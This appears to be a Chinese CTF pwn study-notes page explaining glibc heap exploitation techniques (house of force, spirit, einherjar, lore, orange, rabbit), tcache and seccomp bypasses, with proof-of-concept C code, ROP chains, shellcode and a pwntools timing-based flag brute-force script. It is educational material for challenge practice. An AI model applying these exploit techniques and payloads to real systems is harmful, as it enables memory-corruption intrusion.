<p><strong>修改文件描述符</strong>： STDIN_FILENO属于系统API接口库，其声明为 int 型，是一个打开文件句柄，对应的函数主要包括 open/read/write/close 等系统级调用。  操作系统一级提供的文件API都是以文件描述符来表示文件。STDIN_FILENO就是标准输入设备（一般是键盘）的文件描述符。 </p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210406222444981.png" alt="image-20210406222444981"></p>
<p>例：如果将文件描述符改为0x29a，就相当于将flag里的文件键入到缓存区中。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210406222701397.png" alt="image-20210406222701397"></p>
<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p><strong>使用条件：</strong>可以修改topchunk大小，可以控制分配堆的大小，libc&lt;2.29</p>
<p>通过溢出等操作，将top chunk的大小改为-1，在请求一块大小为 （目标地址-top chunk地址-两个chunk头的大小（0x10*2）的chunk），将topchunk的地址变为目标地址，在malloc一块地址后就可以获得目标地址的chunk（bins中无chunk），即可进行任意地址写入。</p>
<h3 id="house-of-atum"><a href="#house-of-atum" class="headerlink" title="house of atum"></a>house of atum</h3><p><strong>使用条件</strong>：存在tcache，且可以修改fd指针。</p>
<p><em>原理</em>：tcache bin中的chunk的next指针与fastbins的fd指针位置不匹配。如果fastbins中有多个chunk，且tcache中的chunk未填满，则当从fastbins中获得了一个chunk后，剩余的chunk会被整合到tcache（整合到tcache满为止，smallbin相同）</p>
<p>利用：先free8个相同的chunk，这样第8个freechunk将会被放入fastbins中，且fd指针会被置为0，申请一个chunk（将会从tcahe中获得）将获得的chunk中的fd指针改为chunk-0x20，这样，在fastbins中的chunk的fd指针会变为chunk-0x10，从而可以改写size大小，进而做进一步利用。</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p><strong>使用条件</strong>： 该区域前后内存可控，且存在一个可控指针作为free()的参数。</p>
<p><em>原理</em>：通过布局前后内存，伪造出一个fakechunk，再将此fakechunk free进fastbins中，再次malloc即可获得该区域的控制权。</p>
<p>利用：构造两个fakechunk，其中，第一个fakechunk的IS_MMAPPED和NON_MAIN_ARENA都得为0，第二个fakechunk的大小要在0x20~0x21000之间。<strong>如果可以修改一个即将被释放的指针，将此指针改为第一个fakechunk的数据域的地址</strong>，就可以将fakechunk变为真chunk进入fastbins中，在malloc即可获得改fakechunk。</p>
<h3 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h3><p><strong>使用条件</strong>：  有off-by-one漏洞能修改PREV_INUSE位，（有栈地址）</p>
<p><em>原理</em>：将prev_size域修改为该堆块与目标堆块位置的偏移，如果目标堆块在栈上，即在栈上获得堆块。</p>
<p>利用：申请chunka和chunkb，在栈上伪造一个fake free chunk，利用chunka的null byte溢出漏洞，即可覆盖到chunkb的size域（最好是0x100的倍数）并清空PREV_INUSE位，同时将prev_size域设置为chunkb与栈上的fake free chunk的地址偏移，当chunkb被释放时，就会根据prev_size找到前一个同样是被释放状态的fakechunk，此时两个堆块进行合并，合并后放入topchunk中（因为freechunk与topchunk相邻），下一次分配的chunk就会出现在fakechunk的位置。（在构造fake free chunk时，可以将fd和bk指针全部指向自身一绕过unlink的检查）</p>
<h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h3><p><strong>使用条件</strong>：</p>
<p><em>原理</em>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">if (in_smallbin_range(nb)) &#123;</span><br><span class="line">        // 获取 small bin 的索引</span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        // 获取对应 small bin 中的 chunk 指针</span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span><br><span class="line">        // 如果 victim = bin ，那说明该 bin 为空。</span><br><span class="line">        // 如果不相等，那么会有两种情况</span><br><span class="line">        if ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            // 第一种情况，small bin 还没有初始化。</span><br><span class="line">            if (victim == 0) /* initialization check */</span><br><span class="line">                // 执行初始化，将 fast bins 中的 chunk 进行合并</span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            </span><br><span class="line">            //重重重点！！！！！</span><br><span class="line">            // 第二种情况，small bin 中存在空闲的 chunk</span><br><span class="line">            else &#123;</span><br><span class="line">                // 获取 small bin 中倒数第二个 chunk 。</span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                // 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">                if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">                    goto errout;</span><br><span class="line">                &#125;</span><br><span class="line">                // 设置 victim 对应的 inuse 位</span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">                // 如果不是 main_arena，设置对应的标志</span><br><span class="line">                if (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                // 细致的检查</span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                // 将申请到的 chunk 转化为对应的 mem 状态</span><br><span class="line">                void *p = chunk2mem(victim);</span><br><span class="line">                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                return p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>利用：在栈上构造两个fakechunk，将第一个fakechunk的fd指针指向smallbin中的最后一个chunk（即victim）（绕过bck-&gt;fd是否=victim），将第一个fakechunk的bk指针指向第二个fakechunk，将第二个fakechunk的fd指针指向第一个fakechunk（绕过最后一次malloc时，第一个fakechunk从smallbin中解链的检查）。先malloc一个小chunk（victim）（大小在fastbin之间），然后free进入fastbin中，在malloc一个chunk，防止与topchunk合并。然后在malloc一个largechunk，使fastbins中的freechunk合并进入unsortbin中（运用了fastbin dup consolidate），然后放入smallbin中，此时修改victim的bk指针指向栈上的第一个fakechunk，然后malloc和victim一样大小的chunk（这时，栈上的第一个fakechunk进入了smallbin中），再次malloc即可得到栈上的fakechunk。</p>
<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p><strong>使用条件</strong>：题目不存在free函数或其他释放堆块的函数</p>
<p><em>原理</em>： 当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 </p>
<p>利用：伪造一个topchunk，其size大小要满足：</p>
<ul>
<li>伪造的 size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
<li> 伪造的size必须要对齐到内存页 </li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>

<p> 一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。  因此我们伪造的 fake_size可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#define fake_size 0x1fe1</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x10);</span><br><span class="line">    ptr=(void *)((int)ptr+24);</span><br><span class="line"></span><br><span class="line">    *((long long*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    malloc(0x2000);</span><br><span class="line"></span><br><span class="line">    malloc(0x60);</span><br><span class="line">&#125;</span><br><span class="line">//分配后堆经过了brk扩展</span><br><span class="line">//原有的堆</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line"></span><br><span class="line">//经过扩展的堆</span><br><span class="line">0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]</span><br><span class="line"></span><br><span class="line">malloc(0x60);</span><br><span class="line">0x602030</span><br><span class="line"></span><br><span class="line">0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 &lt;== 未被清零的unsorted bin链表</span><br><span class="line">0x602040:   0x0000000000602020  0x0000000000602020</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000001f51 &lt;== 切割剩下的新unsorted bin</span><br><span class="line">0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>



<h3 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h3><p><em>原理</em>： 我们知道，fastbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块，</p>
<p>利用：malloc大小相同的chunk1、chunk2（满足释放后能进入fastbins），再malloc一个chunk防止合并，释放这两个相同的chunk，进入fastbins中，<strong>此时修改chunk1的size为chunk1+chunk2的大小</strong>，再申请一个large chunk，调用malloc_consolidate()函数，将fastbin中的freechunk先放入unsorted bins中，再放回small bins中，small bins状况如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(0x050)  smallbin[ 3]: 0x602050</span><br><span class="line">(0x0a0)  smallbin[ 8]: 0x602000 (overlap chunk with 0x602050(freed) )</span><br></pre></td></tr></table></figure>

<p>第二种是修改fd指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">unsigned long* chunk1=malloc(0x40); //0x602000</span><br><span class="line">unsigned long* chunk2=malloc(0x100);//0x602050</span><br><span class="line"></span><br><span class="line">chunk2[1]=0x31; //fake chunk size 0x30</span><br><span class="line">chunk2[7]=0x21  //fake chunk&#x27;s next chunk</span><br><span class="line">chunk2[11]=0x21 //fake chunk&#x27;s next chunk&#x27;s next chuck</span><br><span class="line">/* Heap laylout</span><br><span class="line">0000| 0x602000 --&gt; 0x0 </span><br><span class="line">0008| 0x602008 --&gt; 0x51 (&#x27;Q&#x27;)</span><br><span class="line">0016| 0x602010 --&gt; 0x0 </span><br><span class="line">......</span><br><span class="line">0080| 0x602050 --&gt; 0x0 </span><br><span class="line">0088| 0x602058 --&gt; 0x111 </span><br><span class="line">0096| 0x602060 --&gt; 0x0 </span><br><span class="line">0104| 0x602068 --&gt; 0x31 (&#x27;1&#x27;)</span><br><span class="line">0112| 0x602070 --&gt; 0x0 </span><br><span class="line">......</span><br><span class="line">0144| 0x602090 --&gt; 0x0 </span><br><span class="line">0152| 0x602098 --&gt; 0x21 (&#x27;!&#x27;)</span><br><span class="line">0160| 0x6020a0 --&gt; 0x0 </span><br><span class="line">0168| 0x6020a8 --&gt; 0x0 </span><br><span class="line">0176| 0x6020b0 --&gt; 0x0 </span><br><span class="line">0184| 0x6020b8 --&gt; 0x21 (&#x27;!&#x27;)</span><br><span class="line">0192| 0x6020c0 --&gt; 0x0 </span><br><span class="line">......</span><br><span class="line">0352| 0x602160 --&gt; 0x0 </span><br><span class="line">0360| 0x602168 --&gt; 0x20ea1</span><br><span class="line">*/</span><br><span class="line">free(chunk1);</span><br><span class="line">chuck1[0]=0x602060;// modify the fd of chunk1</span><br><span class="line">/*</span><br><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x602000 --&gt; 0x602060 (size error (0x30)) --&gt; 0x0</span><br><span class="line">*/</span><br><span class="line">malloc(5000);// malloc a  big chunk to trigger malloc consolidate</span><br><span class="line">/*</span><br><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0x6034f0 (size : 0x1fb10) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x050)  smallbin[ 3]: 0x602000</span><br><span class="line">(0x030)  smallbin[ 1]: 0x602060</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h3 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h3><p>vsyscall的地址不会随机化其中包含了系统调用，也有用于构造SROP的gadgets<code>syscall;ret</code></p>
<p>vDSO的地址会随机化，两者最大的不同就是vDSO通过共享库的形式进行映射。64位称为linux-vdso.so.1，32位称为linux-gate.so.1，所有glibc的程序都使用了vdso，其实现了四个系统调用gettimeofday、time、getcpu、clock_gettime。另外，AUXiliary Vector的AT_SYSINFO_EHDR就是vDSO的地址。</p>
<h3 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h3><p>tcache中有两个结构体，一个是<strong>tcache_entry</strong>和<strong>tcache_perthread_struct</strong>,其中后者位于对开头的位置，这说明他本身也是个堆块，其中包含数组entries，用于存放64个bins的地址，数组count存放每个bins中的chunk的数量。<strong>每个被放入bins的chunk都会在其用户数据中包含一个tcache_entry(即fd指针)，指向同bins中的下一个chunk的用户数据（不是chunk头）。</strong>其中count的大小为0x40。先free的chunk后出。 存在tcache的情况下，64位程序需要申请超过0x400大小chunk ，才能进入unsortbin。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210403135405470.png" alt="image-20210403135405470"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210403135758688.png" alt="image-20210403135758688"></p>
<p>可以利用uaf等漏洞申请到这个结构体，即可控制tcache。</p>
<h3 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h3><p><strong>prctl(38, 1LL, 0LL, 0LL, 0LL);</strong></p>
<p> PR_SET_NO_NEW_PRIVS（38）的第二个参数若设置为1，那么程序线程将不能通过执行execve系统调用来获得提权，该选项只对execve这个系统调用有效。意思就是若你使用syscall(59,’/bin/sh’,null,null)或system(“/bin/sh”)（内部还是系统调用execve）获得的线程shell，用户组依然是之前的用户组，且不能获得更高权限。 </p>
<p><strong>prctl(22, 2LL, &amp;v1);</strong></p>
<p> 如果参数2为SECCOMP_MODE_STRICT(1),则只允许调用read,write,_exit(not  exit_group),sigreturn这几个syscall.如果参数2为SECCOMP_MODE_FILTER(2),则为过滤模式,其中对syscall的限制通过参数3的结构体，来自定义过滤规则。 </p>
<p>当发现有沙箱函数后，我们可以利用open、read、write来从服务器上读取flag并输出</p>
<p><strong>沙箱安装</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>

<p><strong>seccomp-tools dump ./8bit_adventure</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#openat(0,flag_addr,0)</span><br><span class="line">rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(0) + p64(openat_addr)</span><br><span class="line">#read(fd,flag_addr,0x30)</span><br><span class="line">rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)</span><br><span class="line">#puts(flag_addr)</span><br><span class="line">rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)</span><br><span class="line">rop += &#x27;/flag\x00&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>禁用了execve()和write。需要逐个字节比较爆破。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210507211456199.png" alt="image-20210507211456199"></p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./chall&#x27;)</span><br><span class="line">context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def exp(index,ch):</span><br><span class="line">    #open(&#x27;/home/pwn/flag&#x27;,0)</span><br><span class="line">    #如果不能输入‘\x00’,就利用移位指令</span><br><span class="line">    #payload = &#x27;push 0x10032aaa;pop rdi;shr edi,12;xor rsi,rsi;push 2;pop rax;syscall;&#x27;</span><br><span class="line">    payload = &#x27;push 0x10032;pop rdi;xor rsi,rsi;push 2;pop rax;syscall;&#x27;</span><br><span class="line">    </span><br><span class="line">    #read(fd,0x10040,0x50)</span><br><span class="line">    payload += &#x27;mov rdi,rax;xor eax,eax;push 0x50;pop rdx;push 0x10040;pop rsi;syscall;&#x27;</span><br><span class="line">	</span><br><span class="line">	#如果相同则跳到cmp变成死循环，不相同则返回</span><br><span class="line">    if index == 0:</span><br><span class="line">        payload += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(index, ch)</span><br><span class="line">    else:</span><br><span class="line">        payload += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(index, ch)</span><br><span class="line">    payload = asm(payload,arch=&#x27;amd64&#x27;)</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    io.sendafter(&#x27;execution-box.\n&#x27;,payload.ljust(0x40-14,b&#x27;a&#x27;)+b&#x27;/home/pwn/flag&#x27;)</span><br><span class="line"></span><br><span class="line">index = 0</span><br><span class="line">ans = []</span><br><span class="line">while 1:</span><br><span class="line">    for ch in range(0x20, 127):</span><br><span class="line">        io = process(&#x27;./chall&#x27;)</span><br><span class="line">        exp(index, ch)</span><br><span class="line">        start = time.time()</span><br><span class="line">        try:</span><br><span class="line">        	#将timeout设置为更大的数方便调试</span><br><span class="line">            io.recv(timeout=2)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">        end = time.time()</span><br><span class="line">        io.close()</span><br><span class="line">        if end-start &gt; 1.5:#如果时间间隔大于1.5秒说明进入死循环即字节相同</span><br><span class="line">            ans.append(ch)</span><br><span class="line">            print(&quot;&quot;.join([chr(i) for i in ans]))</span><br><span class="line">            break</span><br><span class="line">    #else:</span><br><span class="line">    #    print(&quot;&quot;.join([chr(i) for i in ans]))</span><br><span class="line">    #    break</span><br><span class="line">    index = index + 1</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join([chr(i) for i in ans]))</span><br></pre></td></tr></table></figure>

<p>可以调用read+15处的syscall，这样当调用完syscall后会执行后面的ret。当只能用open函数时，不能使用libc中的open，因为open函数中封装的系统调用是openat(257)，必须得使用syscall调用open(2)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">orw  = p64(pop_rdi_ret) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(0)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(2)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(3)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_base  + 0x3000)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(0x30)</span><br><span class="line">orw += p64(Read)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(1)</span><br><span class="line">orw += p64(Write)</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">32位</span><br><span class="line">#open(&#x27;./flag&#x27;,0)</span><br><span class="line">payload = asm(&#x27;push 0x&#x27;+&#x27;ag\x00\x00&#x27;[::-1].encode(&#x27;hex&#x27;))</span><br><span class="line">payload += asm(&#x27;push 0x&#x27;+&#x27;./fl&#x27;[::-1].encode(&#x27;hex&#x27;))</span><br><span class="line">payload += asm(&#x27;mov eax,0x5;mov ebx,esp;xor ecx,ecx;int 0x80;&#x27;)</span><br><span class="line">#read(3,buf,0x30)</span><br><span class="line">payload += asm(&#x27;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&#x27;)</span><br><span class="line">#write(1,buf,0x30)</span><br><span class="line">payload += asm(&#x27;mov ebx,1;mov eax,0x4;int 0x80;&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.send((payload))</span><br></pre></td></tr></table></figure>



<h3 id="malloc（0）"><a href="#malloc（0）" class="headerlink" title="malloc（0）"></a>malloc（0）</h3><p>在libc-2.27的环境下，如果我们malloc（0）我们会获得一个最小的chunk（64位大小为0x20）。如果没有限制申请size的大小，且没有检查size是否为0，我们就可以使用malloc（0）。</p>
<h3 id="Windows-pwn"><a href="#Windows-pwn" class="headerlink" title="Windows pwn"></a>Windows pwn</h3><p><strong>windows保护机制</strong>：GS： GS编译选项的原理就是在堆栈上插入一个安全cookie， 以测试堆栈上的返回地址是否被修改过。安全cookie为四个字 节 。此保护和linux保护中的canary相似。不一样的是，GS保护会调用<code>security_check_cookie</code>函数来检查cookie是否改变。</p>
<h3 id="pwn技巧"><a href="#pwn技巧" class="headerlink" title="pwn技巧"></a>pwn技巧</h3><ul>
<li><p>call指令是将下一条指令地址存入ip中若是有<code>call 寄存器</code> 则可以直接修改函数为函数的plt地址（got地址？）</p>
</li>
<li><p>当找不到/bin/sh时，也可以寻找sh（不要‘/’）</p>
</li>
<li><p>申请chunk时，tcache不会检查size值与tcachebins的值是否一致，但free后会将chunk按他的size值放入bins中</p>
</li>
<li><p>在没有打印函数时，可以用stdout泄露libc地址，接收地址要在发送后就接收</p>
</li>
</ul>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210404194833329.png" alt="image-20210404194833329"></p>
<ul>
<li><p>当打stdout时，接收最好使用recvuntil(‘\x7f’,timeout=1)[-6:]代替recv（6），否则你会后悔的。出现setbuf、setvbuf时，bss段会有相应指向_IO_2_1_stdout_等的指针。且_bss_start默认为指向_IO_2_1_stdout_的指针。</p>
</li>
<li><p>做栈题时，不知道libc的情况下，可以先用远程服务器把函数的真实地址泄露出来，再通过<a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=_IO_2_1_stdin_:5c0,__libc_start_main_ret:e81">此网站</a>查询泄露出来的地址的后三位。</p>
</li>
<li><p><strong>打远程时最好能泄露出函数地址，这样就可以根据泄露的地址计算偏移</strong>。</p>
</li>
<li><p>注意临界条件错误漏洞。出现for循环时一定要仔细分析循环干了什么</p>
</li>
<li><p>改atoi的got表为system也是一个思路。如果将堆指针存在一个数组中，如果可以控制数组，就相当于控制了tcache_struct</p>
</li>
<li><p>简单地说，在main函数前会调用.init段代码和<code>.init_array</code>段的函数数组中每一个函数指针。同样的，main函数<strong>结束后</strong>也会调用**.fini段<strong>代码和</strong><code>.fini._arrary</code>**段的函数数组中的每一个函数指针。并且，init_array和fini_array的地址可以在ida中查看，将这两个数组中的值改为函数的地址，即可跳转至函数的位置，从而控制程序流。</p>
<p> <img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210408202832093.png" alt="image-20210408202832093"></p>
</li>
<li><p>libc中存在一个_environ,存的是当前进程的环境变量，因此，获得libc的基地址后，可以获得_environ的地址，再根据_environ在栈中的偏移，访问栈中任意数据。</p>
</li>
</ul>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210408210619611.png" alt="image-20210408210619611"></p>
<ul>
